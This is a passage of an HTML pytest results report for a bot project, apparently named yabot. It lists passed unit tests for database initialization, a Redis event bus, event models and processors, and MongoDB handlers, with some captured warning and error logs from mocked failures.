        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_database_init.py::TestDatabaseInitializer::test_check_mongodb_migration_status_success</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_database_init.py::TestDatabaseInitializer::test_check_mongodb_migration_status_no_data</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_database_init.py::TestDatabaseInitializer::test_check_mongodb_migration_status_exception</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>WARNING  src.database.init:init.py:175 Error checking MongoDB migration status: Test error<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_database_init.py::TestDatabaseInitializer::test_initialize_mongodb_success</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_database_init.py::TestDatabaseInitializer::test_initialize_mongodb_failure</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>ERROR    src.database.init:init.py:203 Failed to initialize MongoDB collections<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_database_init.py::TestDatabaseInitializer::test_initialize_mongodb_exception</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>ERROR    src.database.init:init.py:208 Error initializing MongoDB: Test error<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_database_init.py::TestDatabaseInitializer::test_initialize_sqlite_success</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_database_init.py::TestDatabaseInitializer::test_initialize_sqlite_failure</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>ERROR    src.database.init:init.py:230 Failed to initialize SQLite tables<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_database_init.py::TestDatabaseInitializer::test_initialize_sqlite_exception</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>ERROR    src.database.init:init.py:235 Error initializing SQLite: Test error<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_database_manager.py::TestDatabaseManager::test_init</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_database_manager.py::TestDatabaseManager::test_is_connected_property</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_database_manager.py::TestDatabaseManager::test_get_mongo_db_not_connected</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_database_manager.py::TestDatabaseManager::test_get_sqlite_conn_not_connected</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_event_bus.py::TestEventBus::test_init</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_event_bus.py::TestEventBus::test_init_with_config</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_event_bus.py::TestEventBus::test_connect_success</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_event_bus.py::TestEventBus::test_connect_failure</td>
          <td class="col-duration">3.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>WARNING  src.events.bus:bus.py:353 Redis connection attempt 1 failed: Connection failed
WARNING  src.events.bus:bus.py:353 Redis connection attempt 2 failed: Connection failed
WARNING  src.events.bus:bus.py:353 Redis connection attempt 3 failed: Connection failed
ERROR    src.events.bus:bus.py:364 Max retries exceeded for Redis connection<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_event_bus.py::TestEventBus::test_connect_with_retry</td>
          <td class="col-duration">3.01</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>ERROR    asyncio:base_events.py:1821 Task was destroyed but it is pending!
task: &lt;Task pending name=&#x27;Task-495&#x27; coro=&lt;EventBus._flush_loop() done, defined at /home/azureuser/repos/yabot/src/events/bus.py:446&gt; wait_for=&lt;Future pending cb=[Task.task_wakeup()]&gt;&gt;
ERROR    asyncio:base_events.py:1821 Task was destroyed but it is pending!
task: &lt;Task pending name=&#x27;Task-496&#x27; coro=&lt;EventBus._retry_loop() done, defined at /home/azureuser/repos/yabot/src/events/bus.py:459&gt; wait_for=&lt;Future pending cb=[Task.task_wakeup()]&gt;&gt;
ERROR    asyncio:base_events.py:1821 Task was destroyed but it is pending!
task: &lt;Task pending name=&#x27;Task-498&#x27; coro=&lt;EventBus._flush_loop() done, defined at /home/azureuser/repos/yabot/src/events/bus.py:446&gt; wait_for=&lt;Future pending cb=[Task.task_wakeup()]&gt;&gt;
ERROR    asyncio:base_events.py:1821 Task was destroyed but it is pending!
task: &lt;Task pending name=&#x27;Task-499&#x27; coro=&lt;EventBus._retry_loop() done, defined at /home/azureuser/repos/yabot/src/events/bus.py:459&gt; wait_for=&lt;Future pending cb=[Task.task_wakeup()]&gt;&gt;
WARNING  src.events.bus:bus.py:353 Redis connection attempt 1 failed: Connection failed
WARNING  src.events.bus:bus.py:353 Redis connection attempt 2 failed: Connection failed<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_event_bus.py::TestEventBus::test_publish_success</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>ERROR    asyncio:base_events.py:1821 Task was destroyed but it is pending!
task: &lt;Task pending name=&#x27;Task-501&#x27; coro=&lt;EventBus._flush_loop() done, defined at /home/azureuser/repos/yabot/src/events/bus.py:446&gt; wait_for=&lt;Future pending cb=[Task.task_wakeup()]&gt;&gt;
ERROR    asyncio:base_events.py:1821 Task was destroyed but it is pending!
task: &lt;Task pending name=&#x27;Task-502&#x27; coro=&lt;EventBus._retry_loop() done, defined at /home/azureuser/repos/yabot/src/events/bus.py:459&gt; wait_for=&lt;Future pending cb=[Task.task_wakeup()]&gt;&gt;<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_event_bus.py::TestEventBus::test_subscribe</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_event_bus.py::TestEventBus::test_subscribe_multiple_handlers</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_event_bus.py::TestEventBus::test_health_check</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_event_bus.py::TestEventBus::test_close</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_event_bus.py::TestEventBus::test_queue_locally</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_event_bus.py::TestEventBus::test_queue_locally_full_queue</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>WARNING  src.events.bus:bus.py:691 Local queue is full, dropping oldest event<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_event_bus.py::TestEventBus::test_process_local_queue</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_event_bus.py::TestEventBus::test_is_connected_property</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_event_bus.py::TestEventBus::test_create_event_bus</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>ERROR    asyncio:base_events.py:1821 Task was destroyed but it is pending!
task: &lt;Task pending name=&#x27;Task-520&#x27; coro=&lt;EventBus._flush_loop() done, defined at /home/azureuser/repos/yabot/src/events/bus.py:446&gt; wait_for=&lt;Future pending cb=[Task.task_wakeup()]&gt;&gt;
ERROR    asyncio:base_events.py:1821 Task was destroyed but it is pending!
task: &lt;Task pending name=&#x27;Task-521&#x27; coro=&lt;EventBus._retry_loop() done, defined at /home/azureuser/repos/yabot/src/events/bus.py:459&gt; wait_for=&lt;Future pending cb=[Task.task_wakeup()]&gt;&gt;<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_event_models.py::TestEventModels::test_base_event_creation</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_event_models.py::TestEventModels::test_base_event_defaults</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_event_models.py::TestEventModels::test_user_interaction_event</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_event_models.py::TestEventModels::test_reaction_detected_event</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_event_models.py::TestEventModels::test_decision_made_event</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_event_models.py::TestEventModels::test_subscription_updated_event</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_event_models.py::TestEventModels::test_narrative_hint_unlocked_event</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_event_models.py::TestEventModels::test_vip_access_granted_event</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_event_models.py::TestEventModels::test_user_deleted_event</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_event_models.py::TestEventModels::test_update_received_event</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_event_models.py::TestEventModels::test_event_models_dict</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_event_models.py::TestEventModels::test_create_event_valid</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_event_models.py::TestEventModels::test_create_event_invalid_type</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_event_models.py::TestEventModels::test_event_inheritance</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_event_processor.py::TestEventProcessor::test_init</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_event_processor.py::TestEventProcessor::test_start_processing</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_event_processor.py::TestEventProcessor::test_stop_processing</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_event_processor.py::TestEventProcessor::test_register_handler</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_event_processor.py::TestEventProcessor::test_handle_subscription_updated</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_event_processor.py::TestEventProcessor::test_handle_user_registered</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_event_processor.py::TestEventProcessor::test_handle_user_deleted</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_event_processor.py::TestEventProcessor::test_handle_vip_access_granted</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_event_processor.py::TestEventProcessor::test_process_subscription_update</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_event_processor.py::TestEventProcessor::test_process_user_registration</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_event_processor.py::TestEventProcessor::test_process_user_deletion</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_event_processor.py::TestEventProcessor::test_process_vip_access_grant</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_event_processor.py::TestEventProcessor::test_add_to_dead_letter_queue</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_event_processor.py::TestEventProcessor::test_health_check</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_event_processor.py::TestEventProcessor::test_is_processing_property</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_event_processor.py::TestEventProcessor::test_retry_dead_letter_queue_empty</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_event_processor.py::TestEventProcessor::test_retry_dead_letter_queue</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_event_processor.py::TestEventProcessor::test_retry_dead_letter_queue_max_retries</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>WARNING  src.events.processor:processor.py:650 No handler found for event type: subscription_updated<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_event_processor.py::TestEventProcessor::test_retry_dead_letter_queue_handler_exception</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>WARNING  src.events.processor:processor.py:637 Failed to retry event processing: 1192fefa-f0cf-41f5-bb87-88fdebbdae2e - Handler error<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_event_processor.py::TestEventProcessor::test_create_event_processor</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_events_module.py::TestEventsModule::test_event_types_defined</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_events_module.py::TestEventsModule::test_event_bus_config_defined</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_events_module.py::TestEventsModule::test_event_bus_exceptions</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_events_module.py::TestEventsModule::test_get_event_logger</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_events_module.py::TestEventsModule::test_event_constants_completeness</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_events_module.py::TestEventsModule::test_event_bus_config_values</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_mongo_schemas.py::TestMongoSchemas::test_user_model_minimal</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_mongo_schemas.py::TestMongoSchemas::test_user_model_full</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_mongo_schemas.py::TestMongoSchemas::test_narrative_fragment_model</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_mongo_schemas.py::TestMongoSchemas::test_item_model</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_mongo_schemas.py::TestMongoSchemas::test_default_values</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_mongodb_handler.py::TestMongoDBHandler::test_init</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_mongodb_handler.py::TestMongoDBHandler::test_get_users_collection</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_mongodb_handler.py::TestMongoDBHandler::test_get_narrative_fragments_collection</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_mongodb_handler.py::TestMongoDBHandler::test_get_items_collection</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_mongodb_handler.py::TestMongoDBHandler::test_initialize_collections_error</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>ERROR    src.database.mongodb:mongodb.py:168 Error initializing MongoDB collections: Test error<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
